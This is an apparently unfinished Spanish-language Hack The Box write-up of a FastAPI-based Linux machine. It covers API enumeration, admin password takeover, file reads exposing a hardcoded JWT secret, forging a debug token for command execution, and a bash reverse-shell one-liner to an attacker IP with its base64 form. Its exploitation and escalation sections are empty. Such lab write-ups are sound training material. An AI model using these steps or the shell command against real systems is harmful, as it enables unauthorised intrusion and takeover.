
![[Pasted image 20241010175210.png]]


https://www.hackthebox.com/machines
---

| ![[Pasted image 20241007194520.png]]![[Pasted image 20241007194515.png]]**  OS** | ![[Pasted image 20241007195719.png]]**  Difficult** | **Tags** | **RELEASED**   | **Social Media**            |
| -------------------------------------------------------------------------------- | --------------------------------------------------- | -------- | -------------- | --------------------------- |
| **LINUX**                                                                        | **MEDIUM**                                          | #API     | **12/04/2022** | https://github.com/gorkaaaa |

Skills:

- API Enumeration
- Abusing API - Registering a new user
- Abusing API - Logging in as the created user
- Enumerating FastApi Endpoints through Docs
- Abusing FastAPI - We managed to change the admin password

- Abusing FastAPI - We get the ability to read files from the machine (Source Analysis)
- Creating our own privileged JWT
- Abusing FastAPI - We achieved remote command execution through the exec endpoint
- Information Leakage (Privilege Escalation)

---

# Enumeración
*Esta fase va a consistir en hacer una enumeración general sobre la máquina para poder valorar vectores de intrusión y valorar posibles ataques.*

1. Comprobamos Conectividad.
```r
❯ ping -c 1 10.10.11.161
PING 10.10.11.161 (10.10.11.161) 56(84) bytes of data.
64 bytes from 10.10.11.161: icmp_seq=1 ttl=63 time=44.0 ms

--- 10.10.11.161 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.959/43.959/43.959/0.000 ms
```
*Vemos que tenemos conectividad con la máquina victima.*

2. Enumeración De Sistema Operativo con script.
```r
❯ whichSystem.py 10.10.11.161

	10.10.11.161 (ttl -> 63): Linux
```
*Vemos que estamos ante un linux.*

3. Enumeración de Puertos con nmap.
```r
❯ sudo nmap -p- --min-rate 5000 -sS -T5 -Pn -n 10.10.11.161 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
*Podemos ver algunos puertos que analizaremos acontinuación.*

```r
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.161
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────
```
*Ejecutamos esta función la cual nos va a copiar los puertos extraidos en la clipboard...*

```r
❯ sudo nmap -p22,80 -sCV 10.10.11.161 -oN targeted
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
|_http-title: Site doesn t have a title (application/json).
|_http-server-header: uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Thu, 10 Oct 2024 20:09:16 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Thu, 10 Oct 2024 20:09:04 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Thu, 10 Oct 2024 20:09:10 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
```
*Podemos ver información detallada sobre cada puerto que hemos escaneado previamente.*

4. Puerto 80
```json
❯ curl -s -X GET 'http://10.10.11.161' | jq
{
  "msg": "UHC API Version 1.0"
}
```
*Al hacer una solicitud nos devuelve un json el cual nos infica la versión de una API...*

```r
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.11.161/FUZZ
000000090:   401        0 L      2 W        30 Ch       "docs"
000001026:   200        0 L      1 W        20 Ch       "api"
```
*Ahroa podemos ver dos rutas que cada una contiene un codigo de estado diferente.*

```json
[/docs => 404]
❯ curl -s -X GET 'http://10.10.11.161/docs' | jq
{
  "detail": "Not authenticated"
}

[/api => 200]
❯ curl -s -X GET 'http://10.10.11.161/api' | jq
{
  "endpoints": [
    "v1"
  ]
}
```
*Mientras que en una vemos que necesitamos estar autenticados para operar sobre ella en la otra podemos ver que nos da una version...*

```r
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.11.161/api/FUZZ
000002237:   200        0 L      1 W        30 Ch       "v1"
```
*Podemos ver que nos lista una ruta que se llama /v1*

```json
❯ curl -s -X GET 'http://10.10.11.161/api/v1' | jq
{
  "endpoints": [
    "user",
    "admin"
  ]
}
```
*Podemos ver que nos está devolviendo dos endpoints...*

```json
[*ENDPOINT USER*]
❯ curl -s -X GET 'http://10.10.11.161/api/v1/user' | jq
{
  "detail": "Not Found"
}

[*ENDPOINT ADMIN*]
❯ curl -s -X GET 'http://10.10.11.161/api/v1/admin/' | jq
{
  "detail": "Not authenticated"
}
```
*Por una parte podemos ver que no nos los está reconociendo y por la otra podemos ver que nos pide autentificación.*

```r
❯ wfuzz -c --hc=404,422 --hh=4 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/user/FUZZ
000000045:   200        0 L      1 W        141 Ch      "1"
```
*Podemos ver esto...*

```json
❯ curl -s -X GET 'http://10.10.11.161/api/v1/user/1' | jq
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
```
*Podemos ver que nos da un email y un id...*

```r
❯ wfuzz -c --hc=405 -X POST -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.11.161/api/v1/user/FUZZ
000000217:   422        0 L      2 W        81 Ch       "signup"
000000053:   422        0 L      3 W        172 Ch      "login"
```
*Podemos ver un login y sun signup *

```json
❯ curl -s -X GET 'http://10.10.11.161/api/v1/user/login' | jq
{
  "detail": [
    {
      "loc": [
        "path",
        "user_id"
      ],
      "msg": "value is not a valid integer",
      "type": "type_error.integer"
    }
  ]
}
```
*Podemos ver esto pero lo vamos a ignorar de momento ya que no tenemos credenciales...*

```json
❯ curl -s -X GET 'http://10.10.11.161/api/v1/user/signup' | jq
{
  "detail": [
    {
      "loc": [
        "path",
        "user_id"
      ],
      "msg": "value is not a valid integer",
      "type": "type_error.integer"
    }
  ]
}
```
*Vamos a centrarnos más en esto...*

```json
❯ curl -s -X POST 'http://10.10.11.161/api/v1/user/signup' -d {"username":"Gorka","password":"Gorka123"} | jq
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "value is not a valid dict",
      "type": "type_error.dict"
    }
  ]
}
```
*Estamos viendo este error lo cual es raro...*

```json
❯ curl -s -X POST 'http://10.10.11.161/api/v1/user/signup' -H "Content-Type: application/json" -d '{"username":"Gorka", "password":"Gorka123"}' | jq
{
  "detail": [
    {
      "loc": [
        "body",
        "email"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```
*Si agregamos el Content-Type y arreglamos un poco el formato de la solicitud podemos ver lo siguiente... Podemos ver que nos esta pidiendo un email, esto es información filtrada sensible con lo cual vamos a indicarle un email.*

```json
❯ curl -s -X POST 'http://10.10.11.161/api/v1/user/signup' -H "Content-Type: application/json" -d '{"email":"gorka@backend.htb", "password":"Gorka123"}' | jq
{}

❯ curl -s -X POST 'http://10.10.11.161/api/v1/user/signup' -H "Content-Type: application/json" -d '{"email":"gorka@backend.htb", "password":"Gorka123"}' | jq
{
  "detail": "The user with this username already exists in the system"
}
```
*Podemos ver que se nos ha creado correctamente el usuario.*

```json
❯ curl -s -X POST 'http://10.10.11.161/api/v1/user/login' -d 'username=gorka@backend.htb&password=Gorka123' | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzI5Mjg0NzE2LCJpYXQiOjE3Mjg1OTM1MTYsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiZTM3ZTlmNmYtYTVjMy00M2U0LTgxMGItNDhkYTYzNTg4OGI0In0.S92uLCHPXdQhjojwwFCyjjzx8Zy5EysC-bsN0ZwEP3U",
  "token_type": "bearer"
}
```
*Ahora podemos ver que hemos podido iniciar sesion de forma satisfactoria y podemos ver que nos ha reportado un token.*

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2V uIiwiZXhwIjoxNzI5Mjg0NzE2LCJpYXQiOjE3Mjg1OTM1MTYsInN1YiI6IjIiLCJp  c19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiZTM3ZTlmNmYtYTVjMy00M2U0LTgxM
GItNDhkYTYzNTg4OGI0In0.S92uLCHPXdQhjojwwFCyjjzx8Zy5EysC-bsN0ZwEP3U",
  "token_type": "bearer"
}
```
*Si vemos el token podemos pensar en algo y es que parece un JWT*

![[Pasted image 20241010184653.png]]
*Podemos ver información pero no tenemos de la credencial para poder modificar campos... Por lo cual no serviria de nada pero podemos probar cosas con este JWT.*

```json
❯ curl -s -X GET 'http://10.10.11.161/api/v1/admin/' -H "Authorization: Bearer eyJhbG....token..." | jq
{
  "results": false
}
```
*Podemos ver que nos sale un mensaje distinto al de antes.*

![[Pasted image 20241010185536.png]]
*Vamos a abrir el burpsuite...*

![[Pasted image 20241010185558.png]]
*Nos dirijimos a proxy...*

![[Pasted image 20241010185641.png]]
*En match and replace en el campo replace vamos a agregar: Authorization: Bearer eyJhbG....token...*

![[Pasted image 20241010185826.png]]
*Ahora vamos a guardarlo...*

![[Pasted image 20241010190047.png]]
*Ahora si recargamos la pagina podemos ver lo siguiente...*

![[Pasted image 20241010190212.png]]
*Si probamos el secretFlagEndpoint podemos ver que nos da la user flag.*

![[Pasted image 20241010190730.png]]
*Si probamos el userId y ponemos 1 podemos ver el del admin y podemos listar su guid*

![[Pasted image 20241010190828.png]]
*Ahora si probamos a cambiarle la contraseña podemos ver que se le ha cambiado correctamente.*

![[Pasted image 20241010190947.png]]
*Ahora si le damos al candado podemos ver que podemos iniciar sesion y si ponemos las nuevas credenciales asignadas al usuario admin podemos ver que estamon como admin...*

![[Pasted image 20241010191034.png]]
*Ahora el admin check nos devuelve true.*

![[Pasted image 20241010191112.png]]
*Podemos ver que el admin file nos devuelve el archivo que necesitemos ya que contamos con el privilegio de administrador a nivel de cookie.*

```r
{
  "file": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/..."
}
```
*Si analizamos con detenimiento el archivo podemos listar dos usuario que tienen una bash, por una parte está htb y por otra root.*

```json
{
  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=c0b35b4b6e4e47c08b0988a3ab21819e\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:18024\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"
}
```
*Al traterse de información sensible lo que estamos buscando puede que se esten aplicando variables de entorno por lo cual esta ruta es la que las contempla y podemos ver un app.main y en la ruta /home/htb/uhc lo que puede decir que concatenandolo podriamos objeter algo, normalmente estoy archivos suelen ser python.*

```json
{"file": "/home/htb/uhc/app/main.py"}
{
  "file": "import asyncio\n\nfrom fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends\nfrom fastapi_contrib.common.responses import UJSONResponse\nfrom fastapi import FastAPI, Depends, HTTPException, status\nfrom fastapi.security import HTTPBasic, HTTPBasicCredentials\nfrom fastapi.openapi.docs import get_swagger_ui_html\nfrom fastapi.openapi.utils import get_openapi...[PYTHON SCRIPT]
}
```
*Podemos ver que efectivamente! Se esta cargando un script...*

![[Pasted image 20241010192658.png]]
*Nos lo traemos a un archivo y con nvim lo tratamos...*

![[Pasted image 20241010192818.png]]
*Con estas expresiones regulares deberiamos de formatear el documento de forma correcta y se debería de entender.*

![[Pasted image 20241010193107.png]]
*Ahora vamos a agragar esto para que se arreglen el tema de las comillas.*

```r
20   │ from app.core.config import settings
```
*Esta linea nos llama la anteción ya que vemos un archivo de configuración y vamos a verlo en detalle.*

```json
{"file": "/home/htb/uhc/app/core/config.py"}
{
  "file": "from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator\nfrom typing import List, Optional, Union\n\nfrom enum import Enum\n\n\nclass Set... [PYTHON SCRIPT]
}
```
*Ahora vamos a exportarlo igual que el otro...*

![[Pasted image 20241010193901.png]]
*Vemos este formato lo cual no es muy legible...*

![[Pasted image 20241010194046.png]]
*Ahora si aplicamos esto podemos ver correctamente todo el contenido y podemos comenzar a identificar lo que pone...*

```r
9   │     JWT_SECRET: str = \"SuperSecretSigningKey-HTB\"
```
*Podemos ver que tenemos el JWT_SECRET...*

![[Pasted image 20241010194319.png]]
*Cuando intentamos hacer un whoami podemos ver que nos dice que no tenemos el debug en el JWT pero tampoco lo podemos agregar ya que necesitamos tener el JWT_SECRET que ya lo tenemos*

![[Pasted image 20241010194501.png]]
*Ahora si le ponemos la clavae y ponemos parametro debug y le asignaos el valor true tenemos el token que necesitamos para ejecutar comandos*

![[Pasted image 20241010195521.png]]
*Cambiamos el token del burp y vemos que ya podemos ejecutar comandos!*

```json
❯ curl -X GET 'http://10.10.11.161/api/v1/admin/exec/ifconfig' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpX..." | jq | sed 's/\\n/\n/g'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   994  100   994    0     0   3590      0 --:--:-- --:--:-- --:--:--  3588
"ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.161  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:fe94:7ac4  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:fe94:7ac4  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:7a:c4  txqueuelen 1000  (Ethernet)
        RX packets 621776  bytes 67877059 (67.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 550926  bytes 67572076 (67.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8370  bytes 658694 (658.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8370  bytes 658694 (658.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0"
```
*Ahora podemos ver como podemos ejecutar comandos a nivel de sistema.*

```r
❯ echo "bash -i >& /dev/tcp/10.10.16.14/443 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC80NDMgMD4mMQo=
```
*Lo convertimos a base64*

```json
❯ curl -X GET 'http://10.10.11.161/api/v1/admin/exec/cat%20auth.log' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXB..." | jq | sed 's/\\n/\n/g'
10/10/2024, 19:47:56 - Login Failure for Tr0ub4dor&3
```
# Explotación
*En esta fase vamos a ya tener un vector de ataque previamente enumerado y vamos a explotarlo.*



# Escalada de privilegios
*Esta fase va a consistir en pasar de ser un usuario no privilegiado a ser el administrador del sistema aprovechandonos de fallos en la seguridad internos del servidor.*

